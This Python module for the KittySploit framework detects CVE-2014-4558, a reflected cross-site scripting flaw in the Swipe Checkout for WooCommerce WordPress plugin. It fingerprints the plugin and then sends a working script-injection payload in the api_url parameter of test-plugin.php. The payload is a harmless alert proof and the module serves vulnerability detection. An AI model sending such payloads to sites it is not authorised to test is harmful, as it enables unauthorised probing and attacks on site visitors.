#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in test-plugin."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WooCommerce Swipe <= 2.7.1 - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting vulnerability in test-plugin.php in the Swipe Checkout for WooCommerce plugin 2.7.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the api_url parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2014', 'cve', 'wpscan', 'wordpress', 'wp-plugin', 'xss', 'woocommerce', 'unauth', 'cybercompany', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/37d7936a-165f-4c37-84a6-7ba5b59a0301',
            'https://nvd.nist.gov/vuln/detail/CVE-2014-4558',
            'http://codevigilant.com/disclosure/wp-plugin-swipehq-payment-gateway-woocommerce-a3-cross-site-scripting-xss',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2014-4558',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('/wp-content/plugins/swipehq-payment-gateway-woocommerce/',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E '
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("'><script>alert(document.domain)</script>",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WooCommerce Swipe <= 2.7.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

